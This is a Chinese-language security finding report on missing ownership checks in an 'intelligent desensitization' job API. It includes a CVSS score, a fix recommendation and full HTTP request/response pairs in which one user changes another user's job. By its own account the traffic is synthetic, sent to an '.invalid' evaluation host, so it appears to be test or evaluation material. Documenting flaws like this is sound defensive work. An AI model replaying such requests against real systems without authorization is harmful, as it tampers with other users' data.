# 示例系统-智能脱敏 作业归属校验缺失：普通用户可修改其他用户的作业设置

CVSS 4.0：CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N  评分 2.3（低危）

## 描述
用户 B 使用自己的普通账号修改用户 A 的作业类型。A 再查询时，类型从空变为 `name`，状态从 `WAITING` 变为 `SUCCESS`，并显示正式文件可用。是否造成漏脱敏未验证；攻击者需要登录并知道作业编号。

## 修复建议
服务端修改作业前校验当前账号是否为创建者或已获授权的协作者。无权访问时拒绝请求，且不改变作业状态。正式文件内容和其他接口未验证。

## 测试过程
测试时间：2026-11-01 10:00:00（北京时间）
执行工具：未记录。先由 A 查询本人作业，再由 B 提交修改请求，最后由 A 回读设置和状态。修改返回 200，回读值发生变化。不带身份的修改返回 401。Burp Repeater 未实际使用；复测时分别使用 A、B 的真实会话，依次发送文末基线、修改和回读请求。失败尝试为不带身份的请求；其他作业状态、批量编号和文件内容未验证。

## 攻击链路
```text
用户 B 已登录并知道用户 A 的作业编号
└─ 提交作业类型修改
   └─ POST /api/jobs/job-a/types
      └─ 用户 A 回读到设置与状态已改变
```

## 证据说明
来源为离线合成报文，没有测试真实账号或真实作业。完整请求与响应按用途附在下方。

**完整请求与响应**

**修改前查询**

请求：

```http
GET /api/jobs/job-a HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 92

{"id":"job-a","owner":"user-a","selectedTypes":[],"state":"WAITING","formalAvailable":false}
```

**其他用户提交修改**

请求：

```http
POST /api/jobs/job-a/types HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-b
Content-Type: application/json
Content-Length: 26

{"selectedTypes":["name"]}
```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 11

{"ok":true}
```

**修改后查询**

请求：

```http
GET /api/jobs/job-a HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 97

{"id":"job-a","owner":"user-a","selectedTypes":["name"],"state":"SUCCESS","formalAvailable":true}
```

**不带身份提交修改**

请求：

```http
POST /api/jobs/job-a/types HTTP/1.1
Host: report-eval.invalid
Content-Type: application/json
Content-Length: 26

{"selectedTypes":["name"]}
```

响应：

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Content-Length: 35

{"error":"authentication_required"}
```
